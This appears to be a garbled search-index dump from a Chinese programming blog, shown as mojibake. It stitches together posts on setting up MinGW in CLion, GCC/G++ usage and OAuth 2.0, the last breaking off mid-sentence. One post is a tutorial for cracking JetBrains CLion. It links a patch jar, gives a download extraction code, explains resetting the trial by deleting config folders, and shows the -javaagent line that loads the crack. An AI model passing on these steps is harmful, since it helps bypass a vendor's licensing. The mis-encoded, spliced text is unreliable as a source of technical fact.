å®‰è£…ç›®å½•ä¸‹ bin ç›®å½•çš„è·¯å¾„æ·»åŠ åˆ°ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ä¸­ éªŒè¯ç¯å¢ƒå˜é‡åœ¨æ‰“å¼€çš„å‘½ä»¤æç¤ºç¬¦çª—å£ä¸­ï¼Œè¾“å…¥ gcc -v ï¼Œç„¶åæŒ‰å›è½¦é”®ï¼ˆEnterï¼‰ï¼Œè‹¥æ§åˆ¶å°æ­£ç¡®è¾“å‡º GCC çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œåˆ™è¯´æ˜å·²æ­£ç¡®é…ç½® MinGW çš„ç¯å¢ƒå˜é‡ CLion é…ç½® MinGWCLion çš„å®‰è£…å¯ä»¥å‚è€ƒæœ¬ç«™æ•™ç¨‹ï¼šJetBrains-CLion æ°¸ä¹…æ¿€æ´» åˆ›å»º CMake é¡¹ç›®è‹¥æ˜¯ C++ é¡¹ç›®ï¼Œåˆ™é€‰æ‹© C++ Executableï¼Œè‹¥æ˜¯ C è¯­è¨€é¡¹ç›®ï¼Œåˆ™é€‰æ‹© C Executableï¼Œç„¶åé€‰æ‹©é¡¹ç›®è·¯å¾„å³å¯ é…ç½®å·¥å…·é“¾è¿›å…¥ CLion å·¥å…·é“¾çš„é…ç½®ç•Œé¢ï¼Œç‚¹å‡»å·¦ä¾§çš„ + å·ï¼Œç¯å¢ƒé€‰æ‹© MinGW é€‰æ‹© MinGW çš„å®‰è£…è·¯å¾„ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè®¾ç½®å¥½ MinGW çš„å®‰è£…è·¯å¾„åï¼ŒCLion ä¼šè‡ªåŠ¨æ¢æµ‹ CMakeã€Makeã€C Compiler å’Œ C++ Compiler å¯¹åº”çš„å¯æ‰§è¡Œç¨‹åºï¼Œä½†é€Ÿåº¦ç•¥æ…¢ï¼Œå¯ç­‰å¾…æ¢æµ‹å®Œæˆï¼Œä¹Ÿå¯æ‰‹åŠ¨é€‰æ‹©å¯æ‰§è¡Œæ–‡ä»¶ ç¼–è¯‘ç¨‹åºé€‰ä¸­éœ€è¦ç¼–è¯‘å’Œè¿è¡Œçš„ C/C++ æºæ–‡ä»¶ï¼Œç„¶åç‚¹å‡» ç»¿è‰²ç®­å¤´ï¼Œè¿™å°±å¯ä»¥ç¼–è¯‘å’Œè¿è¡Œ C/C++ ç¨‹åºäº†ï¼Œç¨‹åºæˆåŠŸè¿è¡Œåï¼Œä¼šåœ¨ CLion çš„è¾“å‡ºçª—å£æ‰“å°è¿è¡Œç»“æœ å‚è€ƒåšå®¢ MinGW å®‰è£…æ•™ç¨‹ MinGW ç¦»çº¿å®‰è£…åŒ…ä¸‹è½½ Cygwin å’Œ MinGW çš„åŒºåˆ«ä¸è”ç³»æ˜¯æ€æ ·çš„ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘å·¥å…·"},{title:"JetBrains-CLion æ°¸ä¹…æ¿€æ´»æ•™ç¨‹",url:"/posts/c0477083.html",text:'æœ€æ–°å…¬å‘Šæœ¬æ–‡é€‚ç”¨äº JetBrains CLion v2019.3/3.1/3.2/3.3 æ°¸ä¹…æ¿€æ´»ï¼Œè‹¥ä½ ä½¿ç”¨çš„æ˜¯æ›´æ–°çš„ç‰ˆæœ¬ï¼Œå»ºè®®å‚è€ƒè¿™ç¯‡åšå®¢ï¼Œä½¿ç”¨æœ€æ–°çš„æ–¹å¼æ¥ç ´è§£ã€‚ å‰è¨€JetBrains CLion æ˜¯ä¸€æ¬¾ä¸“ä¸º C/C++ å¼€å‘æ‰€è®¾è®¡çš„è·¨å¹³å° IDEã€‚æœ¬æ–‡é€‚ç”¨ JetBrains CLion v2019.3/3.1/3.2/3.3 æ°¸ä¹…æ¿€æ´»ï¼Œé™„ç ´è§£è¡¥ä¸å’Œæ¿€æ´»ç ï¼Œå¯ä»¥æ°¸ä¹…æ¿€æ´» Windowsã€MACã€Linux ä¸‹çš„ CLionï¼ï¼ï¼ç½‘ä¸Šæœ‰æ¿€æ´»ç çš„æ¿€æ´»æ–¹å¼ï¼ˆæ›´æ”¹ hostsï¼‰ï¼Œä¸€èˆ¬éƒ½æ˜¯å‡ ä¸ªæœˆæˆ–è€…ä¸€å¹´ï¼Œä½†ä¸‹é¢ä»‹ç»çš„æ–¹æ³•æ˜¯æ°¸ä¹…æ¿€æ´»ï¼Œäº²æµ‹å¯ä»¥æ¿€æ´»æˆåŠŸã€‚JetBrains CLion v2019.3.4 ä»¥åŠä¹‹åçš„ç‰ˆæœ¬æš‚æ—¶åªæ”¯æŒé»˜è®¤çš„ License Server æ¿€æ´»æ–¹å¼ï¼Œæœ›å‘¨çŸ¥ã€‚ èµ„æºä¸‹è½½ JetBrains CLion ä¸‹è½½ï¼šå®˜ç½‘ JetBrains CLion&nbsp;ç ´è§£è¡¥ä¸ä¸‹è½½ï¼šæœ¬ç«™ JetBrains CLion&nbsp;ç ´è§£è¡¥ä¸ä¸‹è½½ï¼šç™¾åº¦ç½‘ç›˜ æå–ç ï¼šu3pe Clione æ¿€æ´»ç¬¬ä¸€æ­¥æ›´æ”¹ hosts æ–‡ä»¶ï¼Œå°† hosts æ–‡ä»¶ä¸­æœ‰å…³ Jetbrains çš„é…ç½®è¡Œå…¨éƒ¨åˆ é™¤æ‰ï¼Œè‹¥æ²¡æœ‰åˆ™è¯·å¿½ç•¥æ­¤æ­¥éª¤ã€‚Windows ç³»ç»Ÿçš„ hosts æ–‡ä»¶è·¯å¾„ä¸ºï¼šC:\\Windows\\System32\\drivers\\etc\\hostsï¼ŒLinux å’Œ Mac ç³»ç»Ÿçš„ hosts æ–‡ä»¶è·¯å¾„ä¸ºï¼š/etc/hostsï¼Œä¸€èˆ¬æƒ…å†µä¸‹åªéœ€åˆ é™¤ä»¥ä¸‹ä¸¤è¡Œå†…å®¹å³å¯ï¼š 120.0.0.0 www.jetbrains.com0.0.0.0 account.jetbrains.com ç¬¬äºŒæ­¥ä¸‹è½½å®‰è£… JetBrains CLionï¼Œç„¶åå¯åŠ¨ CLion å¹¶é€‰æ‹©è¯•â½¤ï¼ˆEvaluate for freeï¼‰æ¨¡å¼è¿›â¼Šè½¯ä»¶ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œé¦–æ¬¡å¯åŠ¨åçš„é…ç½®é¡¹æ ¹æ®è‡ªå·±çš„éœ€è¦å‹¾é€‰ï¼Œæ­¤æ­¥éª¤ä¸ä¼šå½±å“åé¢ç ´è§£çš„è¿‡ç¨‹ã€‚å‡è®¾è½¯ä»¶ä¹‹å‰å·²ç»åœ¨è¯•ç”¨æˆ–è€…è¯•ç”¨è¿‡è€Œä¸”è¿‡æœŸäº†ï¼Œé‚£ä¹ˆå¯ä»¥å…ˆåˆ é™¤ CLion çš„æ‰€æœ‰é…ç½®æ–‡ä»¶ï¼Œç„¶åå†é‡æ–°å¯åŠ¨è½¯ä»¶ï¼ŒCLion é…ç½®æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•å¦‚ä¸‹ï¼š 123456789# Windowsç³»ç»ŸC:\\Documents and Settings\\Administrator\\.clion-2019.3.3\\configC:\\Documents and Settings\\Administrator\\.clion-2019.3.3\\system# Linux/Macç³»ç»Ÿ~/.CLion2019.3/config~/.CLion2019.3/system~/.config/JetBrains #æ­¤ç›®å½•ä»…ä¾›å‚è€ƒï¼Œå‹¿éšä¾¿åˆ é™¤~/.local/share/JetBrains #æ­¤ç›®å½•ä»…ä¾›å‚è€ƒï¼Œå‹¿éšä¾¿åˆ é™¤ (adsbygoogle = window.adsbygoogle || []).push({}); ç¬¬ä¸‰æ­¥JetBrains CLion å¯åŠ¨åï¼ˆè¯•ç”¨æ¨¡å¼ï¼‰ï¼Œæ‰‹åŠ¨é€‰æ‹©åˆ›å»ºæˆ–è€…æ‰“å¼€ä¸€ä¸ªé¡¹ç›®ï¼Œè¿›å…¥åˆ° CLion çš„ä¸»ç•Œé¢ã€‚ç„¶åè§£å‹ç ´è§£è¡¥ä¸å‹ç¼©åŒ…ï¼ˆè§£å‹è·¯å¾„ä¸èƒ½åŒ…å«ä¸­æ–‡å­—ç¬¦ï¼‰ï¼Œå°†ç ´è§£è¡¥ä¸æ–‡ä»¶ jetbrains-key.jar æ‹–è¿› CLion çš„ä¸»ç•Œé¢ï¼Œæ ¹æ®æç¤ºç‚¹å‡» Restart æŒ‰é’®é‡å¯è½¯ä»¶ï¼ˆå¦‚ä¸‹å›¾ï¼‰ã€‚ ç¬¬å››æ­¥JetBrains CLion é‡å¯å®Œæˆåï¼Œåœ¨å¼¹å‡ºçš„ JetbrainsAgent é…ç½®åŠ©æ‰‹å¯¹è¯æ¡†ä¸­é€‰æ‹©å¯¹åº”çš„æ¿€æ´»æ–¹å¼ï¼Œç„¶åç‚¹å‡»å®‰è£…æŒ‰é’®å³å¯ï¼ˆå¦‚ä¸‹å›¾ï¼‰ã€‚å¦‚æœæ˜¯â½†å¤–ç½‘ç¯å¢ƒï¼ˆé“¶è¡Œã€å…¬å®‰å†…ç½‘ï¼‰ï¼Œè¯·åœ¨å¯¹è¯æ¡†ä¸­é€‰æ‹© Activation code æ¿€æ´»æ–¹å¼å’Œå‹¾é€‰ æˆ‘â½†æ³•è®¿é—®å¤–ç½‘çš„é€‰é¡¹ï¼Œä¸€èˆ¬æƒ…å†µä¸‹åªéœ€è¦é€‰æ‹© Activation code æ¿€æ´»æ–¹å¼å³å¯ã€‚æœ€åæ ¹æ®æç¤ºçª—å£ï¼Œå†æ¬¡é‡å¯ CLion å³å¯å®Œæˆæ‰€æœ‰ç ´è§£æ­¥éª¤ã€‚ ç¬¬äº”æ­¥æŸ¥çœ‹æ˜¯å¦ç ´è§£æˆåŠŸï¼ŒCLion çš„èœå•æ å¯¼èˆªåˆ° Help â€“&gt; Aboutï¼Œè‹¥å‡ºç°ä¸‹å›¾çš„ä¿¡æ¯åˆ™è¯´æ˜ç ´è§£æˆåŠŸã€‚ CLion æ”¯æŒçš„å·¥å…·é“¾Windows å¹³å°ä¸‹ï¼ŒCLion æ”¯æŒçš„å·¥å…·é“¾åŒ…æ‹¬ï¼šMinGWã€Cygwinã€Visual Studioã€WSLã€Remote Hostï¼Œå…¶ä¸­ MinGW çš„ä½¿ç”¨å¯ä»¥å‚è€ƒæœ¬ç«™æ•™ç¨‹ï¼š CLion é…ç½® MinGW èƒŒåçš„åŸç†åˆ†æï¼ˆå¯å¿½ç•¥ï¼‰æ³¨ï¼šä½¿ç”¨æœ¬æ–‡æä¾›çš„ç ´è§£è¡¥ä¸æ—¶ï¼Œä¸€å®šè¦ä½¿ç”¨ä¸Šé¢æåˆ°çš„æ–¹æ³•ï¼ˆæ‹–æ‹½ç ´è§£è¡¥ä¸æ–‡ä»¶åˆ° CLion çš„ä¸»ç•Œé¢ï¼‰æ¥ç ´è§£ CLionï¼Œå¦åˆ™ç ´è§£ä¼šå¤±è´¥ã€‚ 1234561. å°†ç ´è§£è¡¥ä¸è§£å‹ç›®å½•ä¸‹çš„important.txtã€jetbrains-key.jaræ–‡ä»¶æ‹·è´åˆ°~/.jetbrainsç›®å½•~/.jetbrains/important.txt~/.jetbrains/jetbrains-agent-v3.0.3.ed81.6052. æ ¹æ®æ“ä½œç³»ç»Ÿçš„ä½æ•°ï¼Œæ‰¾åˆ°åŒ¹é…çš„é…ç½®æ–‡ä»¶~/.CLion2019.3/config/clion.vmoptionsæˆ–è€…~/.CLion2019.3/config/clion64.vmoptionsï¼Œç„¶ååœ¨é…ç½®æ–‡ä»¶æœ«å°¾è¿½åŠ å¦‚ä¸‹ä¸€è¡Œå†…å®¹-javaagent:~/.jetbrains/jetbrains-agent-v3.0.3.ed81.605 å‚è€ƒèµ„æ–™ CLion å¦‚ä½•åˆ›å»ºå¹¶è¿è¡Œ C/C++ ç¨‹åº Jetbrains ç³»åˆ—äº§å“ 2019.3.3 æœ€æ–°æ¿€æ´»æ–¹æ³• CLion ä¸­åˆ›å»ºå¤šä¸ª .c æ–‡ä»¶ä¸èƒ½è¿è¡Œé—®é¢˜åŠæŠ¥é”™é—®é¢˜ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘å·¥å…·"},{title:"Linux ç³»ç»Ÿç¼–ç¨‹ä¹‹äºŒ GCCã€G++ ä¸ GDB çš„ä½¿ç”¨",url:"/posts/af282851.html",text:'GCCGCC ç¼–è¯‘å™¨ä»‹ç»GCCï¼ˆGNU Compiler Collectionï¼‰ç¼–è¯‘å™¨æ˜¯ GNU å¼€æºç»„ç»‡å‘å¸ƒçš„ UNIX/Linux ä¸‹åŠŸèƒ½å¼ºå¤§ã€æ€§èƒ½ä¼˜è¶Šçš„ç¼–è¯‘å™¨ï¼Œæ”¯æŒè·¨å¹³å°äº¤å‰ç¼–è¯‘ï¼Œå®ƒè¿˜å¯ä»¥å°† Cã€C++ ç­‰å¤šç§è¯­è¨€ç¼–å†™çš„æºç¨‹åºç¼–è¯‘ã€é“¾æ¥æˆå¯æ‰§è¡Œæ–‡ä»¶ã€‚è€Œ GDB æ˜¯ GNU æ¨å‡ºçš„åŠŸèƒ½å¼ºå¤§çš„ç¨‹åºè°ƒè¯•å™¨ï¼Œå¯ä»¥è¯´ GCC ä¸ GDB æ˜¯åœ¨ Linux ç¯å¢ƒä¸‹è¿›è¡Œ C/C++ ç¨‹åºå¼€å‘ä¸å¯ç¼ºçš„å·¥å…·ã€‚GCC å¯ä»¥ç¼–è¯‘å¦‚ Cã€C++ã€Object-Cã€Javaã€Fortranã€Pascalã€Modula-3 å’Œ Ada ç­‰å¤šç§ç¼–ç¨‹è¯­è¨€ï¼Œè€Œä¸” GCC åˆæ˜¯ä¸€ä¸ªå¤šå¹³å°ç¼–è¯‘å™¨ï¼Œèƒ½å¤Ÿåœ¨å½“å‰ CPU å¹³å°ä¸Šä¸ºå¤šç§ä¸åŒä½“ç³»æ¶æ„çš„ç¡¬ä»¶å¹³å°å¼€å‘è½¯ä»¶ï¼Œå› æ­¤å°¤å…¶é€‚åˆåœ¨åµŒå…¥å¼è½¯ä»¶é¢†åŸŸçš„å¼€å‘å’Œç¼–è¯‘ã€‚åœ¨ä½¿ç”¨ GCC ç¼–è¯‘ç¨‹åºæ—¶ï¼Œç¼–è¯‘è¿‡ç¨‹å¯ä»¥è¢«ç»†åˆ†ä¸ºå››ä¸ªé˜¶æ®µï¼šé¢„å¤„ç†ã€ç¼–è¯‘ã€æ±‡ç¼–ã€é“¾æ¥ã€‚ GCC ä½¿ç”¨è¯­æ³•ä»‹ç» è¯­æ³•ï¼šgcc [options] [filenames] å‚æ•° ä½œç”¨ ç¼–è¯‘ç¤ºä¾‹ ç¤ºä¾‹è¯´æ˜ -o æŒ‡å®šè¾“å‡ºå¯æ‰§è¡Œç¨‹åºçš„åç§°ï¼Œé»˜è®¤æ–‡ä»¶åä¸ºâ€a.outâ€ gcc hello.c -o hello ç¼–è¯‘å•ä¸ªæºæ–‡ä»¶ hello.cï¼ŒæŒ‡å®šè¾“å‡ºå¯æ‰§è¡Œç¨‹åºçš„åç§°ä¸º helloï¼Œæ”¯æŒåŒæ—¶ç¼–è¯‘å¤šä¸ªæºæ–‡ä»¶ -E ä»…ä½œé¢„å¤„ç†ï¼Œä¸è¿›è¡Œç¼–è¯‘ã€æ±‡ç¼–å’Œé“¾æ¥ gcc -E hello.c -o hello.i ä»…é¢„å¤„ç†æºæ–‡ä»¶ï¼ŒæŒ‡å®šç”Ÿæˆä¸­é—´æ–‡ä»¶ *.iï¼Œæ­¤é˜¶æ®µä¸»è¦å¤„ç†æºæ–‡ä»¶ä¸­çš„ #ifdefã€#includeã€#define ç­‰é¢„å¤„ç†å‘½ä»¤ -S åªç¼–è¯‘åˆ°æ±‡ç¼–è¯­è¨€ï¼Œä¸è¿›è¡Œæ±‡ç¼–å’Œé“¾æ¥ï¼Œç”Ÿæˆæ±‡ç¼–ä»£ç  gcc -S hello.c -o hello.s ä»…ç¼–è¯‘åˆ°æ±‡ç¼–è¯­è¨€ï¼ŒæŒ‡å®šç”Ÿæˆæ±‡ç¼–æºæ–‡ä»¶ *.s -c åªç¼–è¯‘ã€æ±‡ç¼–åˆ°ç›®æ ‡ä»£ç ï¼Œä¸è¿›è¡Œé“¾æ¥ï¼Œç”Ÿæˆç›®æ ‡æ–‡ä»¶ï¼ˆæœºå™¨è¯­è¨€ï¼‰ gcc -c hello.s -o hello.o æ ¹æ®æ±‡ç¼–æºæ–‡ä»¶ *.sï¼ŒæŒ‡å®šç”Ÿæˆç›®æ ‡æ–‡ä»¶ *.oï¼Œæœ€åæ ¹æ®ç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶ï¼Œå¯æ‰§è¡Œ gcc hello.o -o hello å‘½ä»¤ç”Ÿæˆå¯æ‰§è¡Œç¨‹åº -l æŒ‡å®šç¨‹åºé“¾æ¥å“ªä¸ªé™æ€åº“æˆ–è€…åŠ¨æ€åº“ -m è¡¨ç¤ºæ˜¯æ•°å­¦åº“ï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨ math.h å¤´æ–‡ä»¶ gcc hello.c -o hello -lm ç¼–è¯‘å•ä¸ªæºæ–‡ä»¶ hello.cï¼ŒæŒ‡å®šè¾“å‡ºå¯æ‰§è¡Œç¨‹åºåç§°ä¸º helloï¼Œå¹¶æŒ‡å®šç¨‹åºé“¾æ¥åˆ°æ•°å­¦åº“ -I dir åœ¨å¤´æ–‡ä»¶çš„æœç´¢è·¯å¾„åˆ—è¡¨ä¸­æ·»åŠ  dir ç›®å½• -L dir åœ¨åº“æ–‡ä»¶çš„æœç´¢è·¯å¾„åˆ—è¡¨ä¸­æ·»åŠ  dir ç›®å½• -Oã€-O2ã€-O3 å°†ä¼˜åŒ–çŠ¶æ€æ‰“å¼€ï¼Œè¯¥é€‰é¡¹ä¸èƒ½ä¸â€-gâ€ é€‰é¡¹è”åˆä½¿ç”¨ -g åœ¨ç”Ÿæˆçš„å¯æ‰§è¡Œç¨‹åºä¸­åŒ…å«æ ‡å‡†è°ƒè¯•ä¿¡æ¯ -Wall åœ¨å‘ç”Ÿè­¦å‘Šæ—¶å–æ¶ˆç¼–è¯‘æ“ä½œï¼Œå³å°†è­¦å‘Šçœ‹ä½œæ˜¯é”™è¯¯ -pedantic ä¸¥æ ¼è¦æ±‚ä»£ç ç¬¦åˆ ANSI/ISO C æ ‡å‡†ï¼Œè‹¥ä¸ç¬¦åˆåˆ™ç»™å‡ºç¼–è¯‘è­¦å‘Šä¿¡æ¯ -w ç¦æ­¢è¾“å‡ºæ‰€æœ‰è­¦å‘Š -v æ‰“å°ç¼–è¯‘å™¨å†…éƒ¨ç¼–è¯‘å„è¿‡ç¨‹çš„å‘½ä»¤è¡Œä¿¡æ¯å’Œç¼–è¯‘å™¨çš„ç‰ˆæœ¬å· GCC ç¼–è¯‘å•ä¸ªæºæ–‡ä»¶å‡è®¾æœ‰ hello.c å•ä¸ªæºæ–‡ä»¶ï¼Œç¼–è¯‘å‘½ä»¤å¦‚ä¸‹ï¼š gcc hello.c -o hello GCC ç¼–è¯‘å¤šä¸ªæºæ–‡ä»¶å‡è®¾æœ‰ hello.hã€hello.cã€main.c ä¸‰ä¸ªæºæ–‡ä»¶ï¼Œä¸¤ç§ç¼–è¯‘çš„æ–¹å¼å¦‚ä¸‹ï¼š ä¸€æ¬¡æ€§ç¼–è¯‘ï¼šgcc hello.c main.c â€“o hello å¤šæ¬¡ç‹¬ç«‹ç¼–è¯‘ï¼ˆå»ºè®®åŠ ä¸Š -Wall å‚æ•°ï¼‰ï¼š gcc -Wall -c main.c -o main.o gcc -Wall -c hello.c -o hello.o gcc -Wall main.o hello.o -o hello GCC ç¼–è¯‘ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶çš„æµç¨‹ç¼–è¯‘æµç¨‹å›¾ ç¼–è¯‘è¯¦ç»†å‘½ä»¤ æ­¥éª¤ å‘½ä»¤ 1. é¢„å¤„ç† gcc -E hello.c -o hello.i 2. ç¼–è¯‘åˆ°æ±‡ç¼–ä»£ç  gcc -S hello.c -o hello.s 3. æ±‡ç¼–åˆ°ç›®æ ‡ä»£ç ï¼ˆæœºå™¨è¯­è¨€ï¼‰ gcc -c hello.s -o hello.o 4. é“¾æ¥ï¼Œç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ gcc hello.o -o hello ä»¥ä¸Šå››ä¸ªæ­¥éª¤ï¼Œå¯ä»¥åˆæˆä¸€ä¸ªæ­¥éª¤ï¼Œç›´æ¥ç¼–è¯‘é“¾æ¥æˆå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ gcc hello.c -o hello G++G++ ä½¿ç”¨è¯­æ³•ä»‹ç» è¯­æ³•ï¼šg++ [options] [filenames] Makeã€CMakeã€Xmakeã€Automakeã€Autoconfã€Meson å¯¹æ¯” var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++ linuxç³»ç»Ÿç¼–ç¨‹ cè¯­è¨€"},{title:"OAuth 2.0 ç‰¹æ€§ä¸ä»‹ç»",url:"/posts/197facd0.html",text:'å‰è¨€ç”¨æˆ·è®¤è¯ä¸æˆæƒ ç”¨æˆ·è®¤è¯ï¼šå½“ç”¨æˆ·å»è®¿é—®æˆ‘ä»¬çš„ç³»ç»Ÿèµ„æºçš„æ—¶å€™ï¼Œæˆ‘ä»¬çš„ç³»ç»Ÿéœ€è¦éªŒè¯ç”¨æˆ·çš„èº«ä»½ï¼ˆæ¯”å¦‚è´¦å·å’Œå¯†ç è®¤è¯è¿™æ˜¯ä¸€ç§æ–¹å¼ï¼‰ï¼Œå¦‚æœèº«ä»½åˆæ³•åˆ™è®¤è¯é€šè¿‡ï¼Œé¢å‘ç›¸åº”çš„å…æ­»é‡‘ç‰Œï¼Œå¦‚æœéªŒè¯æ²¡é€šè¿‡ï¼Œåˆ™æç¤ºç”¨æˆ·è¯·ä¸‰æ€è€Œåè¡Œï¼Œè¿™å°±æ˜¯ç”¨æˆ·è®¤è¯ ç”¨æˆ·æˆæƒï¼šç”¨æˆ·æˆæƒä¸€èˆ¬æ˜¯ä¸ç”¨æˆ·è®¤è¯ç›¸è¾…ç›¸æˆçš„ï¼Œåœ¨è®¤è¯çš„æ—¶å€™ï¼Œå¦‚æœè®¤è¯é€šè¿‡ï¼Œæˆ‘ä»¬è¿˜ä¼šå°†è¯¥ç”¨æˆ·çš„æƒé™ä¿¡æ¯ç»™æ”¶é›†èµ·æ¥ï¼Œå¹¶å°†ç›¸åº”ä¿¡æ¯ä½œä¸ºä¾æ®ï¼Œå°è£…åœ¨è®¤è¯çš„ HTTP å“åº”ä½“ä¸­ã€‚å½“ç”¨æˆ·è®¤è¯æˆåŠŸåï¼Œè®¿é—®æˆ‘ä»¬ç³»ç»Ÿçš„æŸä¸€ä¸ªæ¨¡å—çš„æ—¶å€™ï¼Œè¯¥æ¨¡å—æ˜¯éœ€è¦åˆ¤æ–­è¯¥ç”¨æˆ·æ˜¯å¦æœ‰æƒè®¿é—®ï¼Œå¦‚æœæ²¡æœ‰è®¿é—®è¯¥èµ„æºçš„è®¿é—®æƒé™ï¼Œç”¨æˆ·ä¹Ÿåªæœ‰è¢«æ‹’ç»è®¿é—®ï¼Œè¿™å°±æ˜¯ç”¨æˆ·æˆæƒ å•ç‚¹ç™»å½•ï¼ˆSSOï¼‰å•ç‚¹ç™»å½•ä¸€èˆ¬å¸¸è§äºåˆ†å¸ƒå¼åº”ç”¨ä¸­ï¼Œç”¨æˆ·åªéœ€è¦ç™»å½•ä¸€æ¬¡ï¼Œå³è®¤è¯ä¸€æ¬¡å°±å¯è®¿é—®åˆ†å¸ƒå¼åº”ç”¨ä¸­çš„æ‰€æœ‰æ¨¡å—ï¼Œè€Œä¸éœ€è¦æ¯è®¿é—®ä¸€ä¸ªæ¨¡å—å°±å¾—å»ç™»å½•è®¤è¯ä¸€æ¬¡ï¼Œè¿™æ ·ç”¨æˆ·å«Œéº»çƒ¦ï¼Œåç«¯è®¤è¯é€»è¾‘ä¹Ÿå†—ä½™ã€‚ ç¬¬ä¸‰æ–¹ç™»å½•ï¼ˆæˆæƒç ï¼‰æ¯”å¦‚ç›®å‰äº’è”ç½‘è¿ç”¨ä¸­çš„å¾®ä¿¡ç™»å½•ã€å¾®åšç™»å½•ã€æ”¯ä»˜å®ç™»å½•ç­‰ï¼Œç”¨æˆ·é€šè¿‡æˆæƒï¼Œç¬¬ä¸‰æ–¹åº”ç”¨ç»™äºˆæˆ‘ä»¬ç³»ç»Ÿè®¿é—®ä»–å¾®ä¿¡ç›¸å…³ä¿¡æ¯çš„æƒé™ï¼Œæˆ‘ä»¬è·å–åè¿›è¡Œæ³¨å†Œï¼Œä½¿å…¶ç§°ä¸ºæˆ‘ä»¬ç³»ç»Ÿçš„æ³¨å†Œäººå‘˜ï¼Œå®ç°ç¬¬ä¸‰æ–¹ç™»å½•ã€‚ OAuth 2.0 æ¦‚è¿°OAuth 2.0 ç®€ä»‹OAuthï¼ˆOpen Authorizationï¼Œå¼€æ”¾æˆæƒï¼‰æ˜¯ä¸ºç”¨æˆ·èµ„æºçš„æˆæƒå®šä¹‰äº†ä¸€ä¸ªå®‰å…¨ã€å¼€æ”¾åŠç®€å•çš„æ ‡å‡†ï¼Œç¬¬ä¸‰æ–¹æ— éœ€çŸ¥é“ç”¨æˆ·çš„è´¦å·åŠå¯†ç ï¼Œå°±å¯è·å–åˆ°ç”¨æˆ·çš„æˆæƒä¿¡æ¯ã€‚OAuth 2.0 æ˜¯ OAuth åè®®çš„å»¶ç»­ç‰ˆæœ¬ï¼Œä½†ä¸å‘åå…¼å®¹ OAuth 1.0ï¼Œå³å®Œå…¨åºŸæ­¢äº† OAuth 1.0ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒOAuth 2.0 è§„å®šäº†å››ç§è·å¾—ä»¤ç‰Œçš„æ–¹å¼ï¼Œå¯ä»¥é€‰æ‹©æœ€é€‚åˆè‡ªå·±çš„é‚£ä¸€ç§æ–¹å¼å‘ç¬¬ä¸‰æ–¹åº”ç”¨é¢å‘ä»¤ç‰Œï¼Œåˆ†åˆ«åŒ…æ‹¬ï¼š ç®€åŒ–æ¨¡å¼ï¼ˆimplicitï¼‰ å¯†ç æ¨¡å¼ï¼ˆpasswordï¼‰ å®¢æˆ·ç«¯æ¨¡å¼ï¼ˆclient_credentialsï¼‰ æˆæƒç æ¨¡å¼ï¼ˆauthorization_codeï¼‰ ç‰¹åˆ«æ³¨æ„ï¼šä¸ç®¡å“ªä¸€ç§æˆæƒæ¨¡å¼ï¼Œç¬¬ä¸‰æ–¹åº”ç”¨ç”³è¯·ä»¤ç‰Œä¹‹å‰ï¼Œéƒ½å¿…é¡»å…ˆåˆ°ç³»ç»Ÿå¤‡æ¡ˆï¼Œè¯´æ˜è‡ªå·±çš„èº«ä»½ï¼Œç„¶åä¼šæ‹¿åˆ°ä¸¤ä¸ªèº«ä»½è¯†åˆ«ç ï¼šå®¢æˆ·ç«¯ IDï¼ˆclient idï¼‰å’Œå®¢æˆ·ç«¯å¯†é’¥ï¼ˆclient secretï¼‰ã€‚è¿™æ˜¯ä¸ºäº†é˜²æ­¢ä»¤ç‰Œè¢«æ»¥ç”¨ï¼Œæ²¡æœ‰å¤‡æ¡ˆè¿‡çš„ç¬¬ä¸‰æ–¹åº”ç”¨ï¼Œæ˜¯ä¸ä¼šæ‹¿åˆ°ä»¤ç‰Œçš„ã€‚ OAuth 2.0 çš„è§’è‰²OAuth 2.0 ä¸­æœ‰ä»¥ä¸‹å‡ ä¸ªè§’è‰²ï¼ˆä»¥å¾®ä¿¡ç¬¬ä¸‰æ–¹ç™»å½•ä¸ºä¾‹ï¼‰ï¼š å®¢æˆ·ç«¯ï¼šè¿™ä¸ªå®¢æˆ·ç«¯å’Œ 